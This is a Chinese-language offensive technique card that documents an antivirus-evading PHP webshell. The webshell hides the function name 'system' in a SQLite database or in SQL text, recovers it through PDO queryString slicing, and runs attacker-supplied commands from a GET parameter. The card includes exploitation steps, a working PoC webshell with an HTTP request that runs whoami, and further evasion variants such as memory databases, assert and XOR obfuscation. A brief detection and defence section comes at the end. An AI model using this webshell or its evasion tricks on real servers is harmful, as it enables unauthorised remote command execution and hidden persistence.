---
id: web-php-rce-webshell-sqlite-query-string-function-name
title: SQLite 数据库当函数名载体：先 file_put_contents 落地 .db，再用 PDO queryString 切片取出 system
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-sqlite-query-string-carrier
aliases:
- sqlite 数据库免杀
- queryString 取函数名
- PDO 读取数据库藏马
- 二进制数据库载体 webshell
tags:
- php
- webshell
- av-bypass
- obfuscation
- sqlite
- pdo
- data-carrier
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:55:57+08:00'
  notes: 已对照原文核对；file_put_contents 落地 db + PDO prepare + queryString substr(-7,6) 取 'system' 与原文一致；原文 D 盾截图显示该样本仍被报'变量函数'级别3，卡内已如实反映；未执行 PHP 载荷
---

## 一句话结论

先把 `system` 这个函数名作为数据（甚至以 Base64 形式）藏进一个 SQLite 数据库文件的表行里，用 `file_put_contents('./x.db', base64_decode($blob))` 落地；webshell 正文完全不出现函数名，而是 `new PDO("sqlite:./x.db")` 打开数据库、按 `name="system"` 取记录，再从 `$stmt->queryString` 用 `substr($queryString, -7, 6)` 截出那 6 个字符，最后 `$f($_GET['b'])` 执行——静态扫描看到的只是"数据库读写"业务代码。

## 原理

- **载体是二进制文件**：SQLite 数据库是带 magic 的二进制文件（`SQLite format 3`），静态扫描器通常只对 `.php` 源码做规则匹配，对随附的 `.db` 往往只做哈希/上传白名单，不会逐字节找"函数名"；把函数名当作表数据存进去，等于把代码要素移出代码文件。
- **`queryString` 是回读口**：PDO 的 `PDOStatement::$queryString` 属性返回该语句的 SQL 文本（含 `where name="system"` 这段字面量）。因此不需要真实命中数据行——**SQL 文本本身就是载体**：`substr($sql_stmt->queryString, -7, 6)` 从 `...name="system"` 末尾取 6 个字符得 `system`（前一位是引号，故偏移 -7 起 6 长）。
- **为什么落地数据库而不直接写字符串**：① 把函数名从"代码常量"变成"外部数据文件的字节"；② 可把整段 base64 blob 内联在 webshell 里（`$datatest="[base64]"`），运行时解码落盘，落盘后的 db 也可以延迟/分步写入；③ 读取路径本身是正常的 PDO 用法，不构成可疑结构。
- **可执行性**：拿到 `$f='system'` 后 `$f($_GET['b'])` 即变量函数调用；整条链只依赖 PDO sqlite 驱动（PHP 默认常带）。
- 局限：webshell 里仍出现 `file_put_contents`、`PDO` 等校验点，且首次访问需写权限；若 `.db` 已存在可省掉落盘步骤。

## 触发条件

- 目标 PHP 启用 PDO 与 sqlite 驱动（`pdo_sqlite`），且 Web 目录可写（用于首次落盘 db）；
- 允许 `file_put_contents`/`base64_decode` 等函数（未被 `disable_functions` 禁用）；
- 防护以源码关键字/结构匹配为主，未对同目录新增的二进制文件做内容审计；
- 攻击者能访问 webshell 并传参（原文用 `$_GET['b']`）。

## 利用步骤

1. 本地构造一个极小的 SQLite 库（一张表如 `test(name)`），或直接在 SQL 里使用 `where name="system"` 而不依赖真实数据。
2. 把库文件 Base64 化，作为 `$datatest` 常量放进 webshell。
3. webshell 逻辑：
   ```php
   file_put_contents('./x.db', base64_decode($datatest));
   $db = new PDO("sqlite:./x.db");
   $stmt = $db->prepare('select * from test where name="system"');
   $stmt->execute();
   $f = substr($stmt->queryString, -7, 6);
   $f($_GET['b']);
   ```
4. 访问 `x.php?b=whoami` 验证；若首次落盘失败（只读目录），改为读取已存在库或换用内存库 `sqlite::memory:` 并在同一请求里建表。
5. 需要更强隐藏时，把 `PDO`/`prepare` 等词也用变量拼接/异或处理，或把 db 放到 uploads 目录下（多数环境可写）。

## PoC

```php
<?php
$datatest = "<base64 of a tiny sqlite db>";       // 也可用 sqlite::memory:
file_put_contents('./x.db', base64_decode($datatest));

$path = "./x.db";
$db = new PDO("sqlite:" . $path);
$sql_stmt = $db->prepare('select * from test where name="system"');
$sql_stmt->execute();

$f = substr($sql_stmt->queryString, -7, 6);        // 取到 "system"
$f($_GET['b']);
```

```http
GET /x.php?b=whoami HTTP/1.1
Host: <target>
```

## 变体与关联

- 变体：不落地 db，直接用 `new PDO("sqlite::memory:")` + `prepare('... name="assert"')`，把载体压缩成"内存数据库里的 SQL 文本"，绕开写文件权限要求。
- 变体：把函数名放进表数据而非 SQL 字面量，用 `fetch()` 取 `$row['name']`，此时 sqlite 文件必须真实存在（但仍然是二进制载体）。
- 变体：把 `queryString` 换成其它会回显语句文本的属性/方法（如 PDO 的 `errorInfo`、异常 message 中带的 SQL 片段）。
- 关联：[[web-php-rce-webshell-doccomment-string-carrier]]（同为"从非代码数据读回代码要素"，那条载体是注释文本）。
- 关联：[[web-php-rce-webshell-xor-encoded-function-name]]（若把 SQL 里的 `system` 也异或化，可与本卡叠加）。
- 边界：`pdo_sqlite` 未启用、`file_put_contents` 被禁、目录只读且不能用内存库时失效；`queryString` 在某些 PDO 驱动/版本中返回格式可能不同（需按实际回读调整 substr 偏移）。

## 检测与防御

- 检测：Web 目录出现新增 `.db`/二进制文件并伴随 PDO 连接；源码中 `queryString` 与 `substr` 组合、SQL 文本里出现执行类函数名；运行时监控 `system`/`exec` 子进程。
- 防御：`disable_functions` 覆盖执行类函数与 `file_put_contents`（按业务取舍）；上传/数据目录禁止写且禁止被 Web 解析；对目录内容做完整性基线，发现新增二进制文件即告警。
